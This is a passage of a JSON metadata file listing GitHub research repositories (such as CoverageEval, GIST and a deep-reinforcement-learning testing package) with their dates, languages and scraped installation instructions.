                    "value": "2021-08-10T21:45:51Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-20T03:18:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "471": {
        "filename": "wunderalbert_prod-neural-materials_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/wunderalbert/prod-neural-materials",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-05-04T16:59:49Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-07T09:09:45Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 75583
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 43192
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "472": {
        "filename": "microsoft_coverage-eval_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/microsoft/coverage-eval",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Check out this repository and install the necessary requirements\n\n`git clone https://github.com/microsoft/coverage-eval.git`\n\n`pip install -r requirements.txt`\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "CoverageEval"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/microsoft/coverage-eval/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "This project may contain trademarks or logos for projects, products, or services. Authorized use of Microsoft \ntrademarks or logos is subject to and must follow \n[Microsoft's Trademark & Brand Guidelines](https://www.microsoft.com/en-us/legal/intellectualproperty/trademarks/usage/general).\nUse of Microsoft trademarks or logos in modified versions of this project must not cause confusion or imply Microsoft sponsorship.\nAny use of third-party trademarks or logos are subject to those third-party's policies.\n \n",
                    "original_header": "Trademarks"
                },
                "confidence": 0.9988852287322683,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/microsoft/coverage-eval/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-06-23T00:15:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-18T06:53:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 4159
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "473": {
        "filename": "elieziosoares_ci_quality_study_replication_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/elieziosoares/ci_quality_study_replication",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-08-16T20:13:36Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-08-23T19:03:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 30503805
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 78534
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1252
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 595
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "474": {
        "filename": "KTH_drr_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ASSERT-KTH/drr",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2018-05-04T09:42:03Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-06T01:20:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 1111588237
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 174672
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 125869
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 99635
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 56418
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "475": {
        "filename": "bears-bugs_saner2019-data_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/bears-bugs/saner2019-data",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2018-12-11T11:00:26Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2019-12-02T01:29:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "476": {
        "filename": "ballet_ballet_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ballet/ballet",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Free software: MIT license\n- Documentation: https://ballet.github.io/ballet\n- Repo: https://github.com/ballet/ballet\n- Project homepage: https://ballet.github.io\n \n",
                    "original_header": "ballet"
                },
                "confidence": 0.9999999981932461,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ballet/ballet/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-04-08T21:35:51Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-27T23:22:42Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 355389
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 8443
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 3738
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 378
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "477": {
        "filename": "FlowSs_GIST_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/FlowSs/GIST",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "This replication package contains the artifact associated with the paper \"GIST: Generated Inputs Sets Transferability in Deep Learning\" in order to help in replicating the results. This paper was submitted to the *ACM Transactions on Software Engineering and Methodology* journal.\n\n**A preprint version of the paper is available on [arxiv](https://arxiv.org/abs/2311.00801)**\n",
                    "type": "Text_excerpt",
                    "original_header": "Replication package for \"GIST: Generated Inputs Sets Transferability in Deep Learning\""
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/FlowSs/GIST/main/README.md"
            },
            {
                "result": {
                    "value": "In order to answer our research questions, we first had to follow the steps detailed in our methodology, i.e. generate for each model the test sets for each procedure, extract prediction/features and cluster for each model under test/procedure. Note that if you download all the required files (see *A note on replication*), you will not need to do that.\n",
                    "type": "Text_excerpt",
                    "original_header": "Setup"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/FlowSs/GIST/main/README.md"
            },
            {
                "result": {
                    "value": "Given the models and generated test sets, one can use the script `generate_pred_sets.py` in order to obtain the features needed. Note that those obtained feature files are part of what is downloaded in the [**pred_sets**](https://zenodo.org/records/10028594) repository on Zenodo.\n\nUsage of the script is:\n\n```\nusage: generate_pred_sets.py [-h] [-m MODEL [MODEL ...]] [-d DATASET] [-t TYPE] [-tm TARGET_MODEL] [-b BATCH_SIZE] [--device DEVICE] [--override]\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -m MODEL [MODEL ...], --model MODEL [MODEL ...]\n                        Model to use for computation. By default, will use ALL registered models for the given dataset. If given, will use only the provided\n                        list of models (e.g. --model preresnet20 vgg19). All instances (i.e. seed) trained are used, e.g. --model vgg19 will use vgg19_0,\n                        vgg19_1, ...\n  -d DATASET, --dataset DATASET\n                        Dataset to use for computation\n  -t TYPE, --type TYPE  Test set type (train, fuzz, gen)\n  -tm TARGET_MODEL, --target_model TARGET_MODEL\n                        Model to be tested on a generated dataset of all models provided with --model argument, e.g --target_model vgg19_0, will test\n                        generated dataset from all instances of all model seeds (except vgg19 ones) on vgg19_0.\n  -b BATCH_SIZE, --batch_size BATCH_SIZE\n  --device DEVICE\n  --override\n```\n\nBasic usage is:\n\n```\npython generate_pred_sets.py -d cifar10 -t fuzz -tm preresnet110_0 -b 128 --device cuda\n```\n\nThis will extract the features files from the model *PreResnet110* (seed 0) (i.e. the target) by using all other models (except *PreResnet110*) generated fuzz test sets and save it in a numpy array name `preresnet110_0_fuzz_X.npz` inside the `pred_sets/cifar10/` directory, where X is the name of model from which we used the test set (e.g. `preresnet20_0`). The batch size is set to 128 and it uses GPU acceleration. This must be done on all models, both being or not being a target. This will allow us to experimentally verify that a given metric M works for all models, by considering them alternately to be the model under test. Note that it will skip the extraction if the file already exists unless the argument `--override` is provided.\n",
                    "type": "Text_excerpt",
                    "original_header": "Extracting features/prediction",
                    "parent_header": [
                        "Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/FlowSs/GIST/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Models are provided (see previous parts). If you wish to retrain them from scratch the models, we used two libraries: \n",
                    "original_header": "Training the models"
                },
                "confidence": 0.9504425548242745,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/FlowSs/GIST/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-10-27T20:32:13Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-10-31T14:52:55Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 117819
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "478": {
        "filename": "lairikeqiA_ZC3_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/lairikeqiA/ZC3",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```shell\nexport CUDA_VISIBLE_DEVICES=0,1,2\npython run.py \\\n --output_dir=./saved_models_codes \\\n --model_type=roberta \\\n --config_name=microsoft/codebert-base \\\n --model_name_or_path=microsoft/codebert-base \\\n --tokenizer_name=roberta-base \\\n --do_train \\\n --do_eval \\\n --train_data_file /dataset/pj_with_func_train.jsonl \\\n --epoch 50 \\\n --save_steps=50 \\\n --block_size 512 \\\n --train_batch_size 32 \\\n --eval_batch_size 48 \\\n --learning_rate 2e-5 \\\n --max_grad_norm 1.0 \\\n --evaluate_during_training \\\n --seed 123456 \n \n\n\n### Inference\n\n```shell\nexport CUDA_VISIBLE_DEVICES=0,1,2\npython run.py \\\n --output_dir=./saved_models_codes \\\n --model_type=roberta \\\n --config_name=microsoft/codebert-base \\\n --model_name_or_path=microsoft/codebert-base \\\n --tokenizer_name=roberta-base \\\n --do_eval \\\n --train_data_file /dataset/pj_with_func_train.jsonl \\\n --query_data_file /dataset/CodeJamData/CodeJamData_py_test.jsonl \\\n --candidate_data_file  /dataset/CodeJamData/CodeJamData_java_test.jsonl \\\n --epoch 50 \\\n --save_steps=50 \\\n --block_size 512 \\\n --train_batch_size 32 \\\n --eval_batch_size 48 \\\n --learning_rate 2e-5 \\\n --max_grad_norm 1.0 \\\n --evaluate_during_training \\\n --seed 123456 \n \n \n",
                    "original_header": "Fine-tune"
                },
                "confidence": 0.9999971472948392,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lairikeqiA/ZC3/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-08-19T11:03:52Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-27T22:58:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 37742
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "479": {
        "filename": "ASSERT-KTH_collector-sahab_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ASSERT-KTH/collector-sahab",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "1. Package the entire project\n    ```bash\n   $ mvn package -DskipTests\n    ```\n2. (Optional) Run the tests\n    ```bash\n   $ mvn test\n    ```\n\n3. Prepare for execution of `collector sahab` by running. The following are the required parameters.\n   ```bash\n   $ java -jar main/target/collector-sahab-1.0-SNAPSHOT-jar-with-dependencies.jar \\\n          -p <path/to/project>\n          -l <left-commit>\n          -r <right-commit>\n          -c <relative/path/to/classfile>\n          --slug <orgName/repoName>\n   ```\n   The following are the optional parameters.\n   1. `--execution-depth` (integer): The depth of the stack trace to be collected. Default is `0`.\n   1. `--selected-test` (list of tests separated by comma): The tests to be executed. Default is `[]` which\n      runs every test in the target project.\n   2. `--output-path` (string): The path where the output will be stored. Default is `output.html`.\n   3. `--cleanup` (boolean): Whether to clean up the temporary files created during execution. Default is `false`.\n   4. `--exclude-random-values` (boolean): Whether to exclude random values in trace. Example: path to temporary files. Default is `false`.\n\n   Following parameters have not been added to `main`, but planned to be added in the future if needed.\n   \n   1.  `numberOfArrayElements`: The number of array elements to be collected. Default is `20`.\n\n   2. `extractParameters`: Whether to extract parameters of the method. Default is `false`. \n\n",
                    "type": "Text_excerpt",
                    "original_header": "Setup project for collecting runtime statistics",
                    "parent_header": [
                        "Collector Sahab",
                        "Execution"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/ASSERT-KTH/collector-sahab/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Our releases are signed using `travis-gumtree-spoon`'s GPG key. The key is hosted\n[here](https://keyserver.ubuntu.com/pks/lookup?op=get&search=0x1429025e3eda19a5).\nYou may run the following commands to verify the signature of a release.\n```shell\ngpg --recv-keys 1429025e3eda19a5\ngpg --verify collector-sahab-<VERSION>-jar-with-dependencies.jar.asc\n```\n> This signature is a type of [detached signature](https://en.wikipedia.org/wiki/Detached_signature),\n> so you need to have the JAR file as well to verify the signature.\n \n",
                    "original_header": "Releases"
                },
                "confidence": 0.9999055682468356,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ASSERT-KTH/collector-sahab/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-03-02T16:03:33Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-01T16:42:10Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 1686339
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 893723
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 16007
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "480": {
        "filename": "lhmtriet_SV_Empirical_Study_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/lhmtriet/SV_Empirical_Study",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-04-21T10:17:03Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-09-16T08:22:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 67520
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 632
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "481": {
        "filename": "emanino_plain_c_nn_benchmark_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/emanino/plain_c_nn_benchmark",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To generate the benchmarks:\n```bash\nmkdir build\ncd build\ncmake ..\nmake -j4 install\n```\n \nThe benchmarks will be inside `./build/export`\n \n",
                    "original_header": "Compiling"
                },
                "confidence": 0.9920116937839945,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/emanino/plain_c_nn_benchmark/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-08-03T15:14:21Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-15T14:40:13Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 62743376
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 17211
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 714
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "482": {
        "filename": "matteobiagiola_drl-testing-experiments_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/matteobiagiola/drl-testing-experiments",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Type:\n\n```commandline\npython -m indago.avf.train --algo <algo-name> \\\n\t--env-name <env-name> --env-id <env-id> \\\n\t--exp-id <exp-id> --avf-policy mlp \\\n\t--build-heldout-test \\\n\t--test-split 0.1 \\\n\t--seed 0 \\\n\t[--regression]\n```\n\nto build a heldout test set where:\n\n`<algo-name> = her | tqc | sac` for Parking, Humanoid and Donkey respectively;\n\n`<env-name> = park | humanoid | donkey`;\n\n`<env-id> = parking-v0 | Humanoid-v0 | DonkeyVAE-v0`;\n\n`<exp-id>` is written on the directory `logs/<algo-name>/<env-id>_<exp-id>`. For example for Parking agent trained above we have `logs/her/parking-v0_1`, i.e. `<exp-id> = 1`.\n\nThe command will create the file `heldout-set-seed-0-0.1-split-5-filter-cls.npz` in the directory `logs/<algo-name>/<env-id>_<exp-id>`. The `--regression` flag is optional, and, if provided, it saves the file `heldout-set-seed-0-0.1-split-5-filter-rgr.npz` that prepares for training a regressor failure predictor rather than a classifier. If the `--regression` flag is provided, it must be provided consistently to the commands below.\n",
                    "type": "Text_excerpt",
                    "original_header": "3.1 Build Held-out Test Set",
                    "parent_header": [
                        "Replication Package for the paper \"Testing of Deep Reinforcement Learning Agents with Surrogate Models\".",
                        "3. Training the Classifier"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/matteobiagiola/drl-testing-experiments/ts/README.md"
            },
            {
                "result": {
                    "value": "Build a heldout test set for the Parking agent trained at step 2. \n\n```commandline\npython -m indago.avf.train --algo her \\\n\t--env-name park --env-id parking-v0 \\\n\t--exp-id 1 --avf-policy mlp \\\n\t--build-heldout-test \\\n\t--test-split 0.1 \\\n\t--seed 0\n```\n\nThe command will create the file `heldout-set-seed-0-0.1-split-5-filter-cls.npz` in the directory `logs/her/parking-v0_1`.\n",
                    "type": "Text_excerpt",
                    "original_header": "3.2 Example Build Test Set for Parking Agent",
                    "parent_header": [
                        "Replication Package for the paper \"Testing of Deep Reinforcement Learning Agents with Surrogate Models\".",
                        "3. Training the Classifier"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/matteobiagiola/drl-testing-experiments/ts/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```commandline\ndocker run --rm -it --mount type=bind,source=\"$(pwd)\",target=/home/indago --workdir /home/indago --name indago-container -p 6006:6006 dockercontainervm/indago:0.1.0\n# do not activate the environment before running the run_smoke_test.sh script\n./run_smoke_test.sh --env-name parking\n./run_smoke_test.sh --env-name humanoid\n./run_smoke_test.sh --env-name donkey\n``` \n",
                    "original_header": "1. Docker image"
                },
                "confidence": 0.9999999999839702,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/matteobiagiola/drl-testing-experiments/ts/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```commandline\ndocker build --no-cache -t indago:latest .\ndocker run --rm -it --mount type=bind,source=\"$(pwd)\",target=/home/indago --workdir /home/indago --name indago-container -p 6006:6006 indago:latest\n# do not activate the environment before running the run_smoke_test.sh script\n./run_smoke_test.sh --env-name parking\n./run_smoke_test.sh --env-name humanoid\n./run_smoke_test.sh --env-name donkey\n``` \nDocker build tested with version (MacOS and Ubuntu 22.04 LTS): \n",
                    "original_header": "1.1 (Optional) Docker build"
                },
                "confidence": 0.999995819169918,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/matteobiagiola/drl-testing-experiments/ts/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To activate the environment inside the docker container type:\n```commandline\nconda activate indago\n```\nThen, type:\n```commandline\npython -m indago.train --algo her -tb logs/tensorboard \\\n\t--seed 2646669604 --env-name park --env-id parking-v0\n``` \n \nType:\n```commandline\npython -m indago.train --algo tqc -tb logs/tensorboard \\\n\t--seed 2646669604 --env-name humanoid --env-id Humanoid-v0\n```\n \nType:\n```commandline\nxvfb-run -a python -m indago.train --algo sac -tb logs/tensorboard \\\n\t--seed 2646669604 --env-name donkey \\\n\t--env-id DonkeyVAE-v0 --log-interval 1000 \\\n\t--exe-path /root/DonkeySimLinuxIndago/donkey_sim.x86_64 \\\n\t--vae-path logs/generated_track/vae-64.pkl --z-size 64 \\\n\t--simulation-mul 5 --headless\n``` \n \nPrepending the python command with `xvfb-run` makes it possible to run the training (and testing) of the Donkey agent within a docker container, by automatically creating a virtual display and destroying it once the command terminates. The rendering is done through the CPU.\n \n",
                    "original_header": "2. Training agents"
                },
                "confidence": 0.9975723579671423,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/matteobiagiola/drl-testing-experiments/ts/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Type:\n```commandline\ntensorboard --logdir logs/tensorboard/<env-id> --host 0.0.0.0\n```\n \n`<env-id> = parking-v0 | Humanoid-v0 | DonkeyVAE-v0-scene-generated_track` \nThe `--host 0.0.0.0` is to be able to access tensorboard from the host machine using `localhost`.\n \n",
                    "original_header": "2.1 Tensorboard Logs"
                },
                "confidence": 0.9715282010681424,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/matteobiagiola/drl-testing-experiments/ts/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Type:\n```commandline\nconda activate indago\n```\n \nto activate the environment.\n \n",
                    "original_header": "3. Training the Classifier"
                },
                "confidence": 0.9944113186820889,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/matteobiagiola/drl-testing-experiments/ts/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "`<env-id> = parking-v0 | Humanoid-v0 | DonkeyVAE-v0`; \n",
                    "original_header": "3.1 Build Held-out Test Set"
                },
                "confidence": 0.9995487049906547,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/matteobiagiola/drl-testing-experiments/ts/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Given a trained agent you can test it using random without a trained classifier. If the agent under test is the Donkey agent then at the commands below you need to append the Donkey simulator related parameters, i.e.:\n```commandline\n--exe-path </path/to/donkey-sim-mac/donkey_sim.app> \\\n--vae-path logs/generated_track/vae-64.pkl \\\n--z-size 64 \\\n--simulation-mul 5 \\\n--headless\n```\n \nMoreover, the python command needs to be prepended by `xvfb-run -a` to enable rendering on a virtual screen within the docker container. \n",
                    "original_header": "4. Testing the Agent"
                },
                "confidence": 0.984050248428354,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/matteobiagiola/drl-testing-experiments/ts/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```commandline\npython -m indago.experiments --algo <algo-name> \\\n\t--exp-id <exp-id> --env-name <env-name> --env-id <env-id> \\\n\t--avf-test-policy random --failure-prob-dist \\\n\t--num-episodes <num-episodes> \\\n\t--num-runs-each-env-config <num-runs> \\\n\t--num-runs-experiments <num-runs-experiments>\n``` \n",
                    "original_header": "4.1.1 Random"
                },
                "confidence": 0.9999976701912059,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/matteobiagiola/drl-testing-experiments/ts/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "It requires a trained classifier. For example, if the classifier trained with `<filter> = 20` and `<layers> = 4` is available, then the sampling approach can be applied.\n```commandline\npython -m indago.experiments --algo <algo-name> \\\n\t--exp-id <exp-id> --env-name <env-name> --env-id <env-id> \\\n\t--avf-test-policy nn --failure-prob-dist \\\n\t--num-episodes <num-episodes> \\\n\t--num-runs-each-env-config <num-runs> \\\n\t--training-progress-filter <filter> \\\n\t--layers <layers> \\\n\t--budget <budget> \\\n\t--num-runs-experiments <num-runs-experiments> \\\n\t[--regression] \\\n\t[--minimize]\n```\n \n",
                    "original_header": "4.1.2 Sampling"
                },
                "confidence": 0.999989272851746,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/matteobiagiola/drl-testing-experiments/ts/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "It requires a trained classifier. For example, if the classifier trained with `<filter> = 20` and `<layers> = 4` is available, then the hill climbing approaches can be applied.\n```commandline\npython -m indago.experiments --algo <algo-name> \\\n\t--exp-id <exp-id> --env-name <env-name> --env-id <env-id> \\\n\t--avf-test-policy <hc-policy> --failure-prob-dist \\\n\t--num-episodes <num-episodes> \\\n\t--num-runs-each-env-config <num-runs> \\\n\t--training-progress-filter <filter> \\\n\t--layers <layers> \\\n\t--hc-counter <hc-counter> \\\n\t--neighborhood-size <neighborhood-size> \\\n\t--budget <budget> \\\n\t--num-runs-experiments <num-runs-experiments> \\\n\t[--regression] \\\n\t[--minimize]\n```\n \n",
                    "original_header": "4.1.3 Hill Climbing Methods"
                },
                "confidence": 0.9997983530374996,
                "technique": "supervised_classification",
